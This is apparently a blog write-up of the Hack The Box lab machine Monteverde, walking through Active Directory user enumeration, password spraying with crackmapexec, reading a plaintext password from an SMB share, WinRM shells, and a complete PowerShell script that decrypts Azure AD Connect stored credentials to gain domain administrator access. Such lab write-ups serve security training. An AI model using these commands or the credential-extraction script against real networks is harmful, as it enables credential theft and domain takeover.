---
layout: post
title: "Hack The Box - Monteverde Writeup"
author: Chr0x6eOs
date: "2020-06-13"
subject: "Monteverde Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Windows, AD, Azure, SMB, samba]
lang: "en"
image:
    path: assets/htb/Monteverde/logo.png
    width: 300
    height: 300
...

# Overview
![Monteverde](/assets/htb/Monteverde/monteverde.png)

[Monteverde](https://www.hackthebox.eu/home/machines/profile/223) is a medium windows box by [egre55](https://www.hackthebox.eu/home/users/profile/1190).

The box starts with enumeration of the domain, where we gather all usernames and then use a password spraying attack. This gives us valid credentials, which we use to connect to a smb-share with credentials saved in a xml file. Using the credentials we can login as the user and read user.txt.

After some enumeration we find that there are lot of Azure AD programs installed. A bit of research gives us an exploit path, where we can extract credentials out of Azure AD Connect. The gathered credentials can be used for the Administrator user and allows us to read root.txt 

## Information Gathering

### Nmap
Starting of with a nmap to check for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.045s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-11 21:41:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/11%Time=5EE2A2E5%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.00: 
|_    Message signing enabled and required
|_smb2-time: Protocol negotiation failed (SMB2)
```

## Enumeration

We have quite a few ports open. Nmap already gives us the domain name (megabank.local), so let us enumerate the domain a bit more using NetBIOS.

### NetBIOS - Port 139

```bash
root@darkness:~# rpcclient -U '' -N 10.10.10.172
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

We can manually enumerate all users using rpcclient.

```bash
rpcclient $> queryuser 0x641
        User Name   :   mhope
        Full Name   :   Mike Hope
        Home Drive  :   \\monteverde\users$\mhope
        Dir Drive   :   H:
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Fri, 03 Jan 2020 14:29:59 CET
        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 CET
        Kickoff Time             :      Thu, 14 Sep 30828 04:48:05 CEST
        Password last set Time   :      Fri, 03 Jan 2020 00:40:06 CET
        Password can change Time :      Sat, 04 Jan 2020 00:40:06 CET
        Password must change Time:      Thu, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...                                
        user_rid :      0x641                              
        group_rid:      0x201                              
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168                                
        bad_password_count:     0x00000001
        logon_count:    0x00000002
        padding1[0..7]...                                  
        logon_hrs[0..21]...
```

Querying the specific users, we can check the logon_count to see if these users were active. Only `AAD_987d7f2f57d2`, `mhope` and `SABatchJobs` have a logon_count of greater than 0.

### Password spraying

We can save the found usernames into a text file and use [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) to check if any of these users use their username as their password. 

```bash
root@darkness:~# for i in $(cat users.txt); do crackmapexec smb -u $i -p $i -d MEGABANK 10.10.10.172; done
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\mhope:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs
```

`SABatchJobs` seems to use it's own username as it's password. Let us enumerate the shares using the found credential.

### SMB - Port 445

Now that we have a valid login, we can check if we have access to any smb-shares.

```bash
root@darkness:~# smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172
[+] IP: 10.10.10.172:445        Name: 10.10.10.172                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY
```

`Users$` sounds promising. Let us mount the share and enumerate it a bit more. We can use `find` to show us all readable files available.

```bash
root@darkness:~# mkdir /mnt/monteverde; mount -o user=SABatchJobs -t cifs //10.10.10.172/users$ /mnt/monteverde
Password for SABatchJobs@//10.10.10.172/users$:  ***********
root@darkness:/mnt/monteverde# find .
.
./dgalanos
./mhope
./mhope/azure.xml
./roleary
./smorgan
```

Mounting the smb-share we seem to have access to a file called `azure.xml`.

```bash
root@darkness:/mnt/monteverde# cat ./mhope/azure.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Reading the file we get a password. Let us again use a password spraying attack to see if we get a hit.

```bash
root@darkness:~# for i in $(cat users.txt); do crackmapexec smb -u $i -p '4n0therD4y@n0th3r$' -d MEGABANK 10.10.10.172; done
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\mhope:4n0therD4y@n0th3r$
```

The user `mhope` seem to use the password we found. Let us see if we get a shell using winrm with this user.

## Getting a shell as user

Using evil-winrm we get a shell as the user `mhope` and can read user.txt.

```powershell
root@darkness:~# evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\mhope\Desktop> type user.txt
49619***************************
```



## Privesc to root

Now that we have a shell as `mhope` and read user.txt, let us enumerate the system to find the privilege escalation vector.

### Enumeration as mhope

```powershell
*Evil-WinRM* PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

Looking around in `C:\Program Files` we can find a lot of Microsoft Azure programs. After some research I came across [this article](https://blog.xpnsec.com/azuread-connect-for-redteam), which shows how to exploit `Microsoft Azure AD Connect` to extract credentials.

We can use the [exploit script](https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/d45633c954ee3d40be1bff82648750f516cd3b80/azuread_decrypt_msol.ps1) from the article, however we have to add `Integrated Security=true;` and change the `Data Source` from `localdb` to `local`. This results into following script:

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(local);Initial Catalog=ADSync;Integrated Security=true;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```



### Exploiting Azure AD Connect

Now that we have the exploit script, we simply need to upload and execute it.

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> upload exploit.ps1 .
Info: Uploading exploit.ps1 to C:\Users\mhope\Documents\.

                                                             
Data: 2340 bytes of 2340 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\mhope\Documents> powershell -file exploit.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

Executing the script we get the credentials for the domain administrator.

### Getting a shell as administrator

Now that we have the credentials for the domain administrator, we can login using evil-winrm and read root.txt.

```powershell
root@darkness:~# evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
12909***************************
```